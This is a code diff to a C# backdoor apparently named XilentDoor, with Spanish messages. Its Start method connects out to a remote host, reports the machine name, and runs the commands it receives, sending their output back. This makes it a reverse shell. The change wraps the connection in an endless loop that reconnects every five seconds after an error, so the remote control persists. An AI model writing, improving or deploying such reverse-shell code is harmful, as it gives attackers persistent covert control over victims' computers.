@@ -15,55 +15,62 @@ namespace XilentDoor.Core
 
         public void Start(string host, int port)
         {
-            try
+            while (true)
             {
-                client = new TcpClient();
-                client.Connect(host, port);
-                NetworkStream stream = client.GetStream();
-                reader = new StreamReader(stream);
-                writer = new StreamWriter(stream) { AutoFlush = true };
-
-                writer.WriteLine("[+] Conexión establecida desde " + Environment.MachineName);
-
-                while (true)
+                try
                 {
-                    ShowPrompt();
-                    string command = reader.ReadLine();
-                    if (command == null) break;
+                    client = new TcpClient();
+                    client.Connect(host, port);
+                    NetworkStream stream = client.GetStream();
+                    reader = new StreamReader(stream);
+                    writer = new StreamWriter(stream) { AutoFlush = true };
 
-                    if (command.ToLower() == "exit")
+                    writer.WriteLine("[+] Conexión establecida desde " + Environment.MachineName);
+
+                    while (true)
                     {
-                        break;
-                    }
-                    else if (command.StartsWith("cd "))
-                    {
-                        string path = command.Substring(3).Trim();
-                        try
+                        ShowPrompt();
+                        string command = reader.ReadLine();
+                        if (command == null) break;
+
+                        if (command.ToLower() == "exit")
                         {
-                            Directory.SetCurrentDirectory(path);
-                            writer.WriteLine($"[+] Directorio cambiado a: {Directory.GetCurrentDirectory()}");
+                            writer.WriteLine("[+] Saliendo...");
+                            break;
                         }
-                        catch (Exception ex)
+                        else if (command.StartsWith("cd "))
                         {
-                            writer.WriteLine($"[!] Error: {ex.Message}");
+                            string path = command.Substring(3).Trim();
+                            try
+                            {
+                                Directory.SetCurrentDirectory(path);
+                                writer.WriteLine($"[+] Directorio cambiado a: {Directory.GetCurrentDirectory()}");
+                            }
+                            catch (Exception ex)
+                            {
+                                writer.WriteLine($"[!] Error: {ex.Message}");
+                            }
                         }
-                    }
-                    else
-                    {
-                        string output = ExecuteCommand(command);
-                        writer.WriteLine(output);
+                        else
+                        {
+                            string output = ExecuteCommand(command);
+                            writer.WriteLine(output);
+                        }
                     }
                 }
-            }
-            catch (Exception ex)
-            {
-                // Manejar errores ?
-            }
-            finally
-            {
-                reader?.Close();
-                writer?.Close();
-                client?.Close();
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"[!] Error: {ex.Message}. Intentando reconectar...");
+                }
+                finally
+                {
+                    reader?.Close();
+                    writer?.Close();
+                    client?.Close();
+                }
+
+                // Esperar un tiempo antes de intentar reconectar
+                Thread.Sleep(5000);
             }
         }
 
